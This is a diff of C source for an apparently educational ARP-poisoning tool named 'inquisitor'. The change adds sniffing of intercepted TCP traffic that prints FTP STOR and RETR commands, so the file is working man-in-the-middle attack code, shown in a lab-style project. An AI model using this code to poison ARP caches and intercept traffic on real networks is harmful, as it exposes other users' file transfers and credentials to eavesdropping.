@@ -1,23 +1,18 @@
 #include "inquisitor.h"
+//eliminar luego
 #include "include/inquisitor.h"
 
-# include <stdio.h>
-# include <stdlib.h>
+#include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
-# include <unistd.h>
-# include <time.h>
-
+#include <unistd.h>
+#include <time.h>
+#include <netinet/tcp.h>
 #include <net/if.h>
 #include <linux/if_ether.h>
 #include <linux/if_packet.h>
 #include <signal.h>
 #include <netinet/ip.h>
-
-//---------------------
-#include <sys/socket.h>
-#include <netdb.h>
-#include <ifaddrs.h>
-#include <linux/if_link.h>
 #include <ifaddrs.h>
 
 volatile int loop = 42;
@@ -80,26 +75,6 @@ static int raw_socket()
 	return (sock_fd);
 }
 
-// static struct in_addr get_access_point_ip(t_session session)
-// {
-//  /*this should be better made but to much for my mental sanity at least for now
-//   * The thing is i should be able to know which is the ip of the access point
-//   * but the way of knowing is against the norm and against the way im doing this project for using it on man in the middle project
-//   * because of course im lazy enough for not doing the same project twice im going to go in deep with c just once :D
-//   * but this part is tricky and im not going to do it now, so fucked im going to asssume that the ip is the one that starts with .1 
-//   * on docker that works but in other kind of networks thats not always correct for example on 42 the access_point is 10.11.254.254
-//   * and of course there is a lot of ways of getting this info but not today baby
-//   * in terminal u can see this here :D command -> ip route show default                                                                                                                                                         deordone@car14s4
-//   */
-// 	struct in_addr target_ip;
-//
-// 	target_ip = session.src.ip;	
-// 	unsigned char *bytes = (unsigned char *)&target_ip.s_addr;
-// 	bytes[3] = 1;
-//
-// 	return (target_ip);
-// }
-
 static void send_packet(int sock, int index, struct arp_packet *pkt, unsigned char *dest_mac) 
 {
 	struct sockaddr_ll sll;
@@ -119,7 +94,7 @@ static void fill_arp_request(t_session session, struct arp_packet *pkt, int prot
 {
 	//Ethernet header	
 	memset(pkt->eth.h_dest, 0xff, 6);          		// Destino: Broadcast (ff:ff:ff:ff:ff:ff)
-	memcpy(pkt->eth.h_source, session.src.mac, 6);   // Origen: Tu MAC
+	memcpy(pkt->eth.h_source, session.src.mac, 6);   // Origen: MAC
 	pkt->eth.h_proto = htons(ETH_P_ARP);			// Tipo: ARP (0x0806)
 
 	//Body ARP
@@ -167,9 +142,6 @@ static void get_access_point_mac(int socket, unsigned int *index, t_session sess
 
 	char *name = get_nic(ifaddr);
 	*index = if_nametoindex(name);           
-	//access_point->ip = session.dst.ip;
-	//access_point->ip = get_access_point_ip(session); 
-	//first.dst.ip = access_point->ip;
 	first.src.ip = session.dst.ip;
 	memcpy(first.dst.mac, session.dst.mac, 6);
 	first.dst.ip = session.src.ip;
@@ -222,17 +194,22 @@ static void poisoning(int sock, int index, t_session session, t_pair access_poin
 		}
 
 		ssize_t bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
+		struct iphdr *ip = (struct iphdr *)(buffer + sizeof(struct ethhdr));
 
-		if (bytes > 0)
+		if (ip->protocol == IPPROTO_TCP) 
 		{
-			struct ethhdr *eth = (struct ethhdr *)buffer;
+			struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct ethhdr) + (ip->ihl * 4));
 
-			if (ntohs(eth->h_proto) == ETH_P_IP)
+			// Calculamos dónde empiezan los datos del FTP
+			unsigned char *payload = (unsigned char *)tcp + (tcp->th_off * 4);
+			int payload_size = bytes - (sizeof(struct ethhdr) + (ip->ihl * 4) + (tcp->th_off * 4));
+
+			if (payload_size > 0)
 			{
-				struct iphdr *ip = (struct iphdr *)(buffer + sizeof(struct ethhdr));
-
-				printf("CAPTURA: %s -> ", inet_ntoa(*(struct in_addr *)&ip->saddr));
-				printf("%s [%ld bytes]\n", inet_ntoa(*(struct in_addr *)&ip->daddr), bytes);
+				if (memmem(payload, payload_size, "STOR ", 5))
+					printf("\033[1;31m[INQUISITOR] DETECTADO 'PUT': %.*s\033[0m", payload_size, payload);
+				else if (memmem(payload, payload_size, "RETR ", 5))
+					printf("\033[1;34m[INQUISITOR] DETECTADO 'GET': %.*s\033[0m", payload_size, payload);
 			}
 		}
 	}
